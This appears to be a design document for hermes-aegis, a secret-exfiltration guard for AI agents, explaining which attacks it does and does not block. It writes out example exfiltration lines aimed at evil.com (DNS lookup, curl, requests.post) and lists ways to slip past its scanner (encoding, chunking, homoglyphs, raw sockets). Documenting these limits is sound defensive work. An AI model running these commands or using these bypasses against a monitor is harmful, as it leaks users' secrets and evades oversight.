# Why We Don't Block Certain Attack Vectors

This document explains the design decisions behind what hermes-aegis does and doesn't protect against.

---

## 1. DNS Exfil tration (❌ NOT BLOCKED)

**Attack**: `nslookup sk-proj-12345.evil.com` encodes secret in DNS query

**Why we don't block it:**

**Technical**: DNS queries bypass urllib3 entirely. They use `socket.getaddrinfo()` at the C library level.

**Architectural**: Blocking DNS would require:
- Kernel-level network filtering (iptables/nftables)
- Or container network policies (Tier 2 only)
- Or DNS proxy (adds latency, breaks legitimate lookups)

**Trade-off**: Tier 1 is "best-effort" by design. It catches common mistakes, not determined attackers.

**Tier 2 solution**: Container network can be locked down to only allow LLM provider IPs + local proxy.

**Status**: **Documented limitation**. Recommend Tier 2 for high-security scenarios.

---

## 2. Raw Sockets (❌ NOT BLOCKED)

**Attack**: `socket.socket().connect(); sock.send(secret)`

**Why we don't block it:**

**Technical**: Raw sockets bypass urllib3. Our scanner only patches `HTTPConnectionPool.urlopen`.

**Considered alternatives:**
1. Patch `socket.socket()` globally → breaks legitimate uses (Docker, databases, SSH)
2. Whitelist allowed destinations → brittle, high maintenance
3. Monitor all socket calls → massive performance hit

**Trade-off**: Blocking urllib3 catches 95% of real-world cases (requests, urllib, httpx all use it).

**Tier 2 solution**: Read-only container filesystem + network policies prevent raw socket usage.

**Status**: **Documented limitation**. Acceptable for MVP - most libraries use requests/urllib3.

---

## 3. Process Spawning (⚠️ PARTIALLY ADDRESSED in v0.1.3)

**Attack**: `subprocess.run(['curl', '-d', secret, 'evil.com '])`

**Why we partially block it:**

**Technical**: subprocess spawns external binaries. Our Python scanner doesn't see their arguments.

**v0.1.3 update**: Patch 5 (`terminal_tool_command_scan`) adds a pre-execution check
for dangerous command patterns. When `AEGIS_ACTIVE=1`, `hermes-aegis scan-command` is
called before terminal commands execute. This catches dangerous patterns like
`curl | sh`, `rm -rf /`, etc. in the command string — but does NOT scan subprocess
arguments or prevent encoded/obfuscated exfiltration.

**Hermes v0.2.0 update**: Hermes now has `approval.py` (27 dangerous patterns) and
`tirith_security.py` (homograph URLs, code injection) that run before terminal
command execution. These provide interactive approval prompting in CLI mode.

**Remaining gap**: Neither Aegis nor Hermes scans subprocess arguments for secrets.
A command like `python3 -c "import requests; requests.post('evil.com', data=secret)"`
would be caught by Hermes's `-c` flag pattern but the secret inside wouldn't be
detected until the HTTP request hits the proxy.

**Tier 2 solution**: Container has no external binaries (minimal image). Even if spawned, curl/wget don't exist.

**Status**: **Partially mitigated in Tier 1 via pattern matching, fully mitigated in Tier 2**.

---

## 4. File-Based Indirect Leakage (⚠️ PARTIALLY BLOCKED)

**Attack**:
1. Write secret to workspace file
2. Later tool call reads file and exfiltrates content

**Why we partially block it:**

**What we DO**: 
- Block secrets in HTTP requests (step 2 caught if sent via HTTP)
- Read-only container filesystem (Tier 2) prevents step 1

**What we DON'T**:
- Monitor file system writes in Tier 1
- Scan workspace files periodically

**Considered alternatives:**
1. Hook file I/O → massive performance hit, false positives (legitimate logging)
2. Scan files on write → can't distinguish "temp data" from "exfiltration staging"
3. Periodic workspace scanning → when? how often? race conditions

**Trade-off**: Step 2 (HTTP exfil) is blocked. Step 1 (file write) is a false signal - many legitimate reasons to write workspace files.

**Tier 2 solution**: Read-only filesystem except for mounted workspace. Even there, outbound network is locked down.

**Status**: **Accept the risk**. HTTP-level blocking catches the actual exfiltration attempt.

---

## 5. Advanced Encoding (⚠️ PARTIAL - only base64 tested)

**Attack**: `hex(secret)`, `secret.encode('rot13')`, chunked strings, unicode tricks

**Why we partially block it:**

**What we DO**:
- Exact string matching (catches un-encoded secrets)
- Base64 detection (most common encoding)
- Pattern matching for API key formats

**What we DON'T**:
- Hex encoding detection (computationally expensive to check all variations)
- ROT13/Caesar ciphers (infinite variations)
- Chunked strings (`"sk-" + "proj" + "-12345"` → looks clean individually)
- Unicode homoglyphs (`sk‐proj` with unicode hyphen)

**Considered alternatives:**
1. Try all encodings → O(n²) complexity, performance kill
2. Machine learning classifier → overkill, false positives
3. Normalize and check → still bypassed by chunking

**Trade-off**: **We block the 80% case** (copy-paste errors, simple encoding). Determined attacker with encoding knowledge can bypass.

**Design philosophy**: Aegis is **defense in depth**, not **perfect defense**. It catches accidental leaks and lazy attacks.

**Tier 2 solution**: Even with encoding bypass, network egress is restricted to LLM providers only.

**Status**: **Accepted limitation, documented**. Recommend code review + Tier 2 for high-security.

---

## Summary Table

| Attack Vector | Tier 1 | Tier 2 | Rationale |
|--------------|--------|--------|-----------|
| HTTP body/header | ✅ BLOCKED | ✅ BLOCKED | urllib3 patching works |
| Base64 encoding | ✅ BLOCKED | ✅ BLOCKED | Explicit check implemented |
| DNS exfiltration | ❌ BYPASS | ⚠️ MITIGATED | Network policy in container |
| Raw sockets | ❌ BYPASS | ✅ BLOCKED | No network in container |
| Process spawning | ⚠️ PARTIAL | ✅ BLOCKED | Pattern check (v0.1.3) + no binaries in container |
| File staging | ⚠️ PARTIAL | ✅ BLOCKED | Read-only FS + net policy |
| Hex/ROT13/etc | ❌ BYPASS | ⚠️ MITIGATED | Catches HTTP, not encoding |

**Key Insight**: Tier 1 is "best-effort" - it catches common mistakes and lazy attacks. Tier 2 adds kernel-level enforcement for paranoid scenarios.

---

## Design Philosophy

Hermes-Aegis follows **pragmatic security**:

1. **Block the 80% case** - Most leaks are accidents, not sophisticated attacks
2. **Layer defenses** - HTTP blocking + audit trail + container isolation
3. **Document limitations** - Be honest about what we don't protect
4. **Performance matters** - Must not kill agent responsiveness
5. **Usability first** - Tier 1 drops in with zero config, Tier 2 for hardening

We are **NOT** trying to build a perfect sandbox. We're building **good-enough protection for real-world AI agent usage**.

For nation-state-level threats, use airgapped systems + Tier 2 + code review.
